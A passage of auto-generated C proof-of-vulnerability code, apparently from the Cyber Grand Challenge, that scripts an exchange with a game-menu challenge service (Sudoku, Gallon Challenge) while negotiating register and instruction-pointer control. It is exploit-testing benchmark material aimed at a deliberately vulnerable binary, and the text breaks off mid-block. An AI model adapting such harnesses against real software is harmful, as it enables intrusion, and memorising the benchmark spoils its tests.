/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

#include "conv.h"
#include <libpov.h>
int main(void) {
    negotiate_type1(0x00ffffff, 0x00ffffff, 0);
    //*** delay
    delay(100);
    do {
        unsigned char *read_00000;
        unsigned int read_00000_len;
        unsigned int read_00000_ptr = 0;
        //**** delimited read
        static unsigned char read_00000_delim[] = 
            "\x0a";
        read_00000 = NULL;
        read_00000_len = 0;
        int read_00000_res = delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
        if (read_00000_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00000_00000[] = 
            "\x53\x68\x61\x6c\x6c\x20\x77\x65\x20\x70\x6c\x61\x79\x20\x61\x20"
            "\x67\x61\x6d\x65\x3f\x0a";
        read_00000_ptr += data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
        free(read_00000);
        if (read_00000_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00001;
        unsigned int read_00001_len;
        unsigned int read_00001_ptr = 0;
        //**** delimited read
        static unsigned char read_00001_delim[] = 
            "\x0a";
        read_00001 = NULL;
        read_00001_len = 0;
        int read_00001_res = delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 1);
        if (read_00001_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00001_00000[] = 
            "\x0a";
        read_00001_ptr += data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 1);
        free(read_00001);
        if (read_00001_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00002;
        unsigned int read_00002_len;
        unsigned int read_00002_ptr = 0;
        //**** delimited read
        static unsigned char read_00002_delim[] = 
            "\x0a";
        read_00002 = NULL;
        read_00002_len = 0;
        int read_00002_res = delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 1);
        if (read_00002_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00002_00000[] = 
            "\x31\x2e\x20\x48\x61\x6e\x67\x6d\x61\x6e\x0a";
        read_00002_ptr += data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 11);
        free(read_00002);
        if (read_00002_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00003;
        unsigned int read_00003_len;
        unsigned int read_00003_ptr = 0;
        //**** delimited read
        static unsigned char read_00003_delim[] = 
            "\x0a";
        read_00003 = NULL;
        read_00003_len = 0;
        int read_00003_res = delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 1);
        if (read_00003_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00003_00000[] = 
            "\x32\x2e\x20\x43\x68\x65\x73\x73\x0a";
        read_00003_ptr += data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 9);
        free(read_00003);
        if (read_00003_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00004;
        unsigned int read_00004_len;
        unsigned int read_00004_ptr = 0;
        //**** delimited read
        static unsigned char read_00004_delim[] = 
            "\x0a";
        read_00004 = NULL;
        read_00004_len = 0;
        int read_00004_res = delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 1);
        if (read_00004_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00004_00000[] = 
            "\x33\x2e\x20\x53\x75\x64\x6f\x6b\x75\x0a";
        read_00004_ptr += data_match(read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, match_00004_00000, 10);
        free(read_00004);
        if (read_00004_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00005;
        unsigned int read_00005_len;
        unsigned int read_00005_ptr = 0;
        //**** delimited read
        static unsigned char read_00005_delim[] = 
            "\x0a";
        read_00005 = NULL;
        read_00005_len = 0;
        int read_00005_res = delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 1);
        if (read_00005_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00005_00000[] = 
            "\x34\x2e\x20\x47\x61\x6c\x6c\x6f\x6e\x20\x43\x68\x61\x6c\x6c\x65"
            "\x6e\x67\x65\x0a";
        read_00005_ptr += data_match(read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, match_00005_00000, 20);
        free(read_00005);
        if (read_00005_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00006;
        unsigned int read_00006_len;
        unsigned int read_00006_ptr = 0;
        //**** delimited read
        static unsigned char read_00006_delim[] = 
            "\x0a";
        read_00006 = NULL;
        read_00006_len = 0;
        int read_00006_res = delimited_read(0, &read_00006, &read_00006_len, read_00006_delim, 1);
        if (read_00006_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00006_00000[] = 
            "\x35\x2e\x20\x53\x61\x66\x61\x72\x69\x20\x5a\x6f\x6e\x65\x0a";
        read_00006_ptr += data_match(read_00006 + read_00006_ptr, read_00006_len - read_00006_ptr, match_00006_00000, 15);
        free(read_00006);
        if (read_00006_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00007;
        unsigned int read_00007_len;
        unsigned int read_00007_ptr = 0;
        //**** delimited read
        static unsigned char read_00007_delim[] = 
            "\x0a";
        read_00007 = NULL;
        read_00007_len = 0;
        int read_00007_res = delimited_read(0, &read_00007, &read_00007_len, read_00007_delim, 1);
        if (read_00007_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00007_00000[] = 
            "\x36\x2e\x20\x52\x75\x73\x73\x69\x61\x6e\x20\x52\x6f\x75\x6c\x65"
            "\x74\x74\x65\x0a";
        read_00007_ptr += data_match(read_00007 + read_00007_ptr, read_00007_len - read_00007_ptr, match_00007_00000, 20);
        free(read_00007);
        if (read_00007_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00008;
        unsigned int read_00008_len;
        unsigned int read_00008_ptr = 0;
        //**** delimited read
        static unsigned char read_00008_delim[] = 
            "\x0a";
        read_00008 = NULL;
        read_00008_len = 0;
        int read_00008_res = delimited_read(0, &read_00008, &read_00008_len, read_00008_delim, 1);
        if (read_00008_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00008_00000[] = 
            "\x37\x2e\x20\x47\x6c\x6f\x62\x61\x6c\x20\x54\x68\x65\x72\x6d\x6f"
            "\x6e\x75\x63\x6c\x65\x61\x72\x20\x57\x61\x72\x0a";
        read_00008_ptr += data_match(read_00008 + read_00008_ptr, read_00008_len - read_00008_ptr, match_00008_00000, 28);
        free(read_00008);
        if (read_00008_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00009;
        unsigned int read_00009_len;
        unsigned int read_00009_ptr = 0;
        //**** delimited read
        static unsigned char read_00009_delim[] = 
            "\x0a";
        read_00009 = NULL;
        read_00009_len = 0;
        int read_00009_res = delimited_read(0, &read_00009, &read_00009_len, read_00009_delim, 1);
        if (read_00009_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00009_00000[] = 
            "\x38\x2e\x20\x51\x75\x69\x74\x0a";
        read_00009_ptr += data_match(read_00009 + read_00009_ptr, read_00009_len - read_00009_ptr, match_00009_00000, 8);
        free(read_00009);
        if (read_00009_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00010;
        unsigned int read_00010_len;
        unsigned int read_00010_ptr = 0;
        //**** delimited read
        static unsigned char read_00010_delim[] = 
            "\x0a";
        read_00010 = NULL;
        read_00010_len = 0;
        int read_00010_res = delimited_read(0, &read_00010, &read_00010_len, read_00010_delim, 1);
        if (read_00010_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00010_00000[] = 
            "\x0a";
        read_00010_ptr += data_match(read_00010 + read_00010_ptr, read_00010_len - read_00010_ptr, match_00010_00000, 1);
        free(read_00010);
        if (read_00010_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00000_00000[] = 
            "\x33\x0a";
        static unsigned int write_00000_00000_len = 2;
        unsigned char *write_00000 = NULL;
        unsigned int write_00000_len = 0;
        write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
        if (write_00000_len > 0) {
            transmit_all(1, write_00000, write_00000_len);
        }
        free(write_00000);
    } while (0);
    do {
        unsigned char *read_00011;
        unsigned int read_00011_len;
        unsigned int read_00011_ptr = 0;
        //**** delimited read
        static unsigned char read_00011_delim[] = 
            "\x0a";
        read_00011 = NULL;
        read_00011_len = 0;
        int read_00011_res = delimited_read(0, &read_00011, &read_00011_len, read_00011_delim, 1);
        if (read_00011_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00011_00000[] = 
            "\x4c\x65\x74\x20\x6d\x65\x20\x68\x65\x6c\x70\x20\x79\x6f\x75\x20"
            "\x63\x68\x65\x61\x74\x20\x61\x74\x20\x73\x75\x64\x6f\x6b\x75\x2c"
            "\x20\x65\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x62\x6f\x61\x72"
            "\x64\x20\x6e\x30\x30\x62\x3a\x0a";
        read_00011_ptr += data_match(read_00011 + read_00011_ptr, read_00011_len - read_00011_ptr, match_00011_00000, 56);
        free(read_00011);
        if (read_00011_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00001_00000[] = 
            "\x31\x31\x31\x31\x31\x31\x31\x31\x20\x0a\x20\x20\x20\x20\x20\x20"
            "\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20"
            "\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
            "\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20"
            "\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a"
            "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a";
        static unsigned int write_00001_00000_len = 90;
        unsigned char *write_00001 = NULL;
        unsigned int write_00001_len = 0;
        write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
        if (write_00001_len > 0) {
            transmit_all(1, write_00001, write_00001_len);
        }
        free(write_00001);
    } while (0);
    do {
        unsigned char *read_00012;
        unsigned int read_00012_len;
        unsigned int read_00012_ptr = 0;
        //**** delimited read
        static unsigned char read_00012_delim[] = 
            "\x0a";
        read_00012 = NULL;
        read_00012_len = 0;
        int read_00012_res = delimited_read(0, &read_00012, &read_00012_len, read_00012_delim, 1);
        if (read_00012_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00012_00000[] = 
            "\x4e\x69\x63\x65\x20\x74\x72\x79\x0a";
        read_00012_ptr += data_match(read_00012 + read_00012_ptr, read_00012_len - read_00012_ptr, match_00012_00000, 9);
        free(read_00012);
        if (read_00012_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00013;
        unsigned int read_00013_len;
        unsigned int read_00013_ptr = 0;
        //**** delimited read
        static unsigned char read_00013_delim[] = 
            "\x0a";
        read_00013 = NULL;
        read_00013_len = 0;
        int read_00013_res = delimited_read(0, &read_00013, &read_00013_len, read_00013_delim, 1);
        if (read_00013_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00013_00000[] = 
            "\x53\x68\x61\x6c\x6c\x20\x77\x65\x20\x70\x6c\x61\x79\x20\x61\x20"
            "\x67\x61\x6d\x65\x3f\x0a";
        read_00013_ptr += data_match(read_00013 + read_00013_ptr, read_00013_len - read_00013_ptr, match_00013_00000, 22);
        free(read_00013);
        if (read_00013_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00014;
        unsigned int read_00014_len;
        unsigned int read_00014_ptr = 0;
        //**** delimited read
        static unsigned char read_00014_delim[] = 
            "\x0a";
        read_00014 = NULL;
        read_00014_len = 0;
        int read_00014_res = delimited_read(0, &read_00014, &read_00014_len, read_00014_delim, 1);
        if (read_00014_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00014_00000[] = 
            "\x0a";
        read_00014_ptr += data_match(read_00014 + read_00014_ptr, read_00014_len - read_00014_ptr, match_00014_00000, 1);
        free(read_00014);
        if (read_00014_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00015;
        unsigned int read_00015_len;
        unsigned int read_00015_ptr = 0;
        //**** delimited read
        static unsigned char read_00015_delim[] = 
            "\x0a";
        read_00015 = NULL;
        read_00015_len = 0;
        int read_00015_res = delimited_read(0, &read_00015, &read_00015_len, read_00015_delim, 1);
        if (read_00015_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00015_00000[] = 
            "\x31\x2e\x20\x48\x61\x6e\x67\x6d\x61\x6e\x0a";
        read_00015_ptr += data_match(read_00015 + read_00015_ptr, read_00015_len - read_00015_ptr, match_00015_00000, 11);
        free(read_00015);
        if (read_00015_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00016;
        unsigned int read_00016_len;
        unsigned int read_00016_ptr = 0;
        //**** delimited read
        static unsigned char read_00016_delim[] = 
            "\x0a";
        read_00016 = NULL;
        read_00016_len = 0;
        int read_00016_res = delimited_read(0, &read_00016, &read_00016_len, read_00016_delim, 1);
        if (read_00016_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00016_00000[] = 
            "\x32\x2e\x20\x43\x68\x65\x73\x73\x0a";
        read_00016_ptr += data_match(read_00016 + read_00016_ptr, read_00016_len - read_00016_ptr, match_00016_00000, 9);
        free(read_00016);
        if (read_00016_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00017;
        unsigned int read_00017_len;
        unsigned int read_00017_ptr = 0;
        //**** delimited read
        static unsigned char read_00017_delim[] = 
            "\x0a";
        read_00017 = NULL;
        read_00017_len = 0;
        int read_00017_res = delimited_read(0, &read_00017, &read_00017_len, read_00017_delim, 1);
        if (read_00017_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00017_00000[] = 
            "\x33\x2e\x20\x53\x75\x64\x6f\x6b\x75\x0a";
        read_00017_ptr += data_match(read_00017 + read_00017_ptr, read_00017_len - read_00017_ptr, match_00017_00000, 10);
        free(read_00017);
        if (read_00017_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00018;
        unsigned int read_00018_len;
        unsigned int read_00018_ptr = 0;
        //**** delimited read
        static unsigned char read_00018_delim[] = 
            "\x0a";
        read_00018 = NULL;
        read_00018_len = 0;
        int read_00018_res = delimited_read(0, &read_00018, &read_00018_len, read_00018_delim, 1);
        if (read_00018_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00018_00000[] = 
            "\x34\x2e\x20\x47\x61\x6c\x6c\x6f\x6e\x20\x43\x68\x61\x6c\x6c\x65"
            "\x6e\x67\x65\x0a";
        read_00018_ptr += data_match(read_00018 + read_00018_ptr, read_00018_len - read_00018_ptr, match_00018_00000, 20);
        free(read_00018);
        if (read_00018_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00019;
        unsigned int read_00019_len;
        unsigned int read_00019_ptr = 0;
        //**** delimited read
        static unsigned char read_00019_delim[] = 
            "\x0a";
        read_00019 = NULL;
        read_00019_len = 0;
        int read_00019_res = delimited_read(0, &read_00019, &read_00019_len, read_00019_delim, 1);
        if (read_00019_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00019_00000[] = 
            "\x35\x2e\x20\x53\x61\x66\x61\x72\x69\x20\x5a\x6f\x6e\x65\x0a";
        read_00019_ptr += data_match(read_00019 + read_00019_ptr, read_00019_len - read_00019_ptr, match_00019_00000, 15);
        free(read_00019);
        if (read_00019_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00020;
        unsigned int read_00020_len;
        unsigned int read_00020_ptr = 0;
        //**** delimited read
        static unsigned char read_00020_delim[] = 
            "\x0a";
        read_00020 = NULL;
        read_00020_len = 0;
        int read_00020_res = delimited_read(0, &read_00020, &read_00020_len, read_00020_delim, 1);
        if (read_00020_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00020_00000[] = 
            "\x36\x2e\x20\x52\x75\x73\x73\x69\x61\x6e\x20\x52\x6f\x75\x6c\x65"
            "\x74\x74\x65\x0a";
        read_00020_ptr += data_match(read_00020 + read_00020_ptr, read_00020_len - read_00020_ptr, match_00020_00000, 20);
        free(read_00020);
        if (read_00020_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00021;
        unsigned int read_00021_len;
        unsigned int read_00021_ptr = 0;
        //**** delimited read
        static unsigned char read_00021_delim[] = 
            "\x0a";
        read_00021 = NULL;
        read_00021_len = 0;
        int read_00021_res = delimited_read(0, &read_00021, &read_00021_len, read_00021_delim, 1);
        if (read_00021_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00021_00000[] = 
            "\x37\x2e\x20\x47\x6c\x6f\x62\x61\x6c\x20\x54\x68\x65\x72\x6d\x6f"
            "\x6e\x75\x63\x6c\x65\x61\x72\x20\x57\x61\x72\x0a";
        read_00021_ptr += data_match(read_00021 + read_00021_ptr, read_00021_len - read_00021_ptr, match_00021_00000, 28);
        free(read_00021);
        if (read_00021_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00022;
        unsigned int read_00022_len;
        unsigned int read_00022_ptr = 0;
        //**** delimited read
        static unsigned char read_00022_delim[] = 
            "\x0a";
        read_00022 = NULL;
        read_00022_len = 0;
        int read_00022_res = delimited_read(0, &read_00022, &read_00022_len, read_00022_delim, 1);
        if (read_00022_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00022_00000[] = 
            "\x38\x2e\x20\x51\x75\x69\x74\x0a";
        read_00022_ptr += data_match(read_00022 + read_00022_ptr, read_00022_len - read_00022_ptr, match_00022_00000, 8);
        free(read_00022);
        if (read_00022_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00023;
        unsigned int read_00023_len;
        unsigned int read_00023_ptr = 0;
        //**** delimited read
        static unsigned char read_00023_delim[] = 
            "\x0a";
        read_00023 = NULL;
        read_00023_len = 0;
        int read_00023_res = delimited_read(0, &read_00023, &read_00023_len, read_00023_delim, 1);
        if (read_00023_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00023_00000[] = 
            "\x0a";
        read_00023_ptr += data_match(read_00023 + read_00023_ptr, read_00023_len - read_00023_ptr, match_00023_00000, 1);
        free(read_00023);
        if (read_00023_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00002_00000[] = 
            "\x34\x0a";
        static unsigned int write_00002_00000_len = 2;
        unsigned char *write_00002 = NULL;
        unsigned int write_00002_len = 0;
        write_00002 = append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
        if (write_00002_len > 0) {
            transmit_all(1, write_00002, write_00002_len);
        }
        free(write_00002);
    } while (0);
    do {
        unsigned char *read_00024;
        unsigned int read_00024_len;
        unsigned int read_00024_ptr = 0;
        //**** delimited read
        static unsigned char read_00024_delim[] = 
            "\x0a";
        read_00024 = NULL;
        read_00024_len = 0;
        int read_00024_res = delimited_read(0, &read_00024, &read_00024_len, read_00024_delim, 1);
        if (read_00024_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00024_00000[] = 
            "\x47\x69\x76\x65\x20\x6d\x65\x20\x61\x20\x63\x6f\x75\x6e\x74\x64"
            "\x6f\x77\x6e\x21\x0a";
        read_00024_ptr += data_match(read_00024 + read_00024_ptr, read_00024_len - read_00024_ptr, match_00024_00000, 21);
        free(read_00024);
        if (read_00024_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00003_00000[] = 
            "\x32";
        static unsigned int write_00003_00000_len = 1;
        unsigned char *write_00003 = NULL;
        unsigned int write_00003_len = 0;
        write_00003 = append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
        if (write_00003_len > 0) {
            transmit_all(1, write_00003, write_00003_len);
        }
        free(write_00003);
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00004_00000[] = 
            "\x0a";
        static unsigned int write_00004_00000_len = 1;
        unsigned char *write_00004 = NULL;
        unsigned int write_00004_len = 0;
        write_00004 = append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
        if (write_00004_len > 0) {
            transmit_all(1, write_00004, write_00004_len);
        }
        free(write_00004);
    } while (0);
    do {
        unsigned char *read_00025;
        unsigned int read_00025_len;
        unsigned int read_00025_ptr = 0;
        //**** delimited read
        static unsigned char read_00025_delim[] = 
            "\x0a";
        read_00025 = NULL;
        read_00025_len = 0;
        int read_00025_res = delimited_read(0, &read_00025, &read_00025_len, read_00025_delim, 1);
        if (read_00025_res) {} //silence unused variable warning
        free(read_00025);
        if (read_00025_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00026;
        unsigned int read_00026_len;
        unsigned int read_00026_ptr = 0;
        //**** delimited read
        static unsigned char read_00026_delim[] = 
            "\x0a";
        read_00026 = NULL;
        read_00026_len = 0;
        int read_00026_res = delimited_read(0, &read_00026, &read_00026_len, read_00026_delim, 1);
        if (read_00026_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00026_00000[] = 
            "\x49\x20\x73\x61\x79\x20\x68\x75\x72\x6c\x2c\x20\x69\x66\x20\x79"
            "\x6f\x75\x20\x62\x6c\x6f\x77\x20\x63\x68\x75\x6e\x6b\x73\x20\x61"
            "\x6e\x64\x20\x73\x68\x65\x20\x63\x6f\x6d\x65\x73\x20\x62\x61\x63"
            "\x6b\x2c\x20\x73\x68\x65\x27\x73\x20\x79\x6f\x75\x72\x73\x2e\x0a";
        read_00026_ptr += data_match(read_00026 + read_00026_ptr, read_00026_len - read_00026_ptr, match_00026_00000, 64);
        free(read_00026);
        if (read_00026_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00027;
        unsigned int read_00027_len;
        unsigned int read_00027_ptr = 0;
        //**** delimited read
        static unsigned char read_00027_delim[] = 
            "\x0a";
        read_00027 = NULL;
        read_00027_len = 0;
        int read_00027_res = delimited_read(0, &read_00027, &read_00027_len, read_00027_delim, 1);
        if (read_00027_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00027_00000[] = 
            "\x53\x68\x61\x6c\x6c\x20\x77\x65\x20\x70\x6c\x61\x79\x20\x61\x20"
            "\x67\x61\x6d\x65\x3f\x0a";
        read_00027_ptr += data_match(read_00027 + read_00027_ptr, read_00027_len - read_00027_ptr, match_00027_00000, 22);
        free(read_00027);
        if (read_00027_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00028;
        unsigned int read_00028_len;
        unsigned int read_00028_ptr = 0;
        //**** delimited read
        static unsigned char read_00028_delim[] = 
            "\x0a";
        read_00028 = NULL;
        read_00028_len = 0;
        int read_00028_res = delimited_read(0, &read_00028, &read_00028_len, read_00028_delim, 1);
        if (read_00028_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00028_00000[] = 
            "\x0a";
        read_00028_ptr += data_match(read_00028 + read_00028_ptr, read_00028_len - read_00028_ptr, match_00028_00000, 1);
        free(read_00028);
        if (read_00028_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00029;
        unsigned int read_00029_len;
        unsigned int read_00029_ptr = 0;
        //**** delimited read
        static unsigned char read_00029_delim[] = 
            "\x0a";
        read_00029 = NULL;
        read_00029_len = 0;
        int read_00029_res = delimited_read(0, &read_00029, &read_00029_len, read_00029_delim, 1);
        if (read_00029_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00029_00000[] = 
            "\x31\x2e\x20\x48\x61\x6e\x67\x6d\x61\x6e\x0a";
        read_00029_ptr += data_match(read_00029 + read_00029_ptr, read_00029_len - read_00029_ptr, match_00029_00000, 11);
        free(read_00029);
        if (read_00029_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00030;
        unsigned int read_00030_len;
        unsigned int read_00030_ptr = 0;
        //**** delimited read
        static unsigned char read_00030_delim[] = 
            "\x0a";
        read_00030 = NULL;
        read_00030_len = 0;
        int read_00030_res = delimited_read(0, &read_00030, &read_00030_len, read_00030_delim, 1);
        if (read_00030_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00030_00000[] = 
            "\x32\x2e\x20\x43\x68\x65\x73\x73\x0a";
        read_00030_ptr += data_match(read_00030 + read_00030_ptr, read_00030_len - read_00030_ptr, match_00030_00000, 9);
        free(read_00030);
        if (read_00030_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00031;
        unsigned int read_00031_len;
        unsigned int read_00031_ptr = 0;
        //**** delimited read
        static unsigned char read_00031_delim[] = 
            "\x0a";
        read_00031 = NULL;
        read_00031_len = 0;
        int read_00031_res = delimited_read(0, &read_00031, &read_00031_len, read_00031_delim, 1);
        if (read_00031_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00031_00000[] = 
            "\x33\x2e\x20\x53\x75\x64\x6f\x6b\x75\x0a";
        read_00031_ptr += data_match(read_00031 + read_00031_ptr, read_00031_len - read_00031_ptr, match_00031_00000, 10);
        free(read_00031);
        if (read_00031_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00032;
        unsigned int read_00032_len;
        unsigned int read_00032_ptr = 0;
        //**** delimited read
        static unsigned char read_00032_delim[] = 
            "\x0a";
        read_00032 = NULL;
        read_00032_len = 0;
        int read_00032_res = delimited_read(0, &read_00032, &read_00032_len, read_00032_delim, 1);
        if (read_00032_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00032_00000[] = 
            "\x34\x2e\x20\x47\x61\x6c\x6c\x6f\x6e\x20\x43\x68\x61\x6c\x6c\x65"
            "\x6e\x67\x65\x0a";
        read_00032_ptr += data_match(read_00032 + read_00032_ptr, read_00032_len - read_00032_ptr, match_00032_00000, 20);
        free(read_00032);
        if (read_00032_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00033;
        unsigned int read_00033_len;
        unsigned int read_00033_ptr = 0;
        //**** delimited read
        static unsigned char read_00033_delim[] = 
            "\x0a";
        read_00033 = NULL;
        read_00033_len = 0;
        int read_00033_res = delimited_read(0, &read_00033, &read_00033_len, read_00033_delim, 1);
        if (read_00033_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00033_00000[] = 
            "\x35\x2e\x20\x53\x61\x66\x61\x72\x69\x20\x5a\x6f\x6e\x65\x0a";
        read_00033_ptr += data_match(read_00033 + read_00033_ptr, read_00033_len - read_00033_ptr, match_00033_00000, 15);
        free(read_00033);
        if (read_00033_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00034;
        unsigned int read_00034_len;
        unsigned int read_00034_ptr = 0;
        //**** delimited read
        static unsigned char read_00034_delim[] = 
            "\x0a";
        read_00034 = NULL;
        read_00034_len = 0;
        int read_00034_res = delimited_read(0, &read_00034, &read_00034_len, read_00034_delim, 1);
        if (read_00034_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00034_00000[] = 
            "\x36\x2e\x20\x52\x75\x73\x73\x69\x61\x6e\x20\x52\x6f\x75\x6c\x65"
            "\x74\x74\x65\x0a";
        read_00034_ptr += data_match(read_00034 + read_00034_ptr, read_00034_len - read_00034_ptr, match_00034_00000, 20);
        free(read_00034);
        if (read_00034_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00035;
        unsigned int read_00035_len;
        unsigned int read_00035_ptr = 0;
        //**** delimited read
        static unsigned char read_00035_delim[] = 
            "\x0a";
        read_00035 = NULL;
        read_00035_len = 0;
        int read_00035_res = delimited_read(0, &read_00035, &read_00035_len, read_00035_delim, 1);
        if (read_00035_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00035_00000[] = 
            "\x37\x2e\x20\x47\x6c\x6f\x62\x61\x6c\x20\x54\x68\x65\x72\x6d\x6f"
            "\x6e\x75\x63\x6c\x65\x61\x72\x20\x57\x61\x72\x0a";
        read_00035_ptr += data_match(read_00035 + read_00035_ptr, read_00035_len - read_00035_ptr, match_00035_00000, 28);
        free(read_00035);
        if (read_00035_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned char *read_00036;
        unsigned int read_00036_len;
        unsigned int read_00036_ptr = 0;
        //**** delimited read
        static unsigned char read_00036_delim[] = 
            "\x0a";
        read_00036 = NULL;
        read_00036_len = 0;
        int read_00036_res = delimited_read(0, &read_00036, &read_00036_len, read_00036_delim, 1);
        if (read_00036_res) {} //silence unused variable warning
        //**** read match data
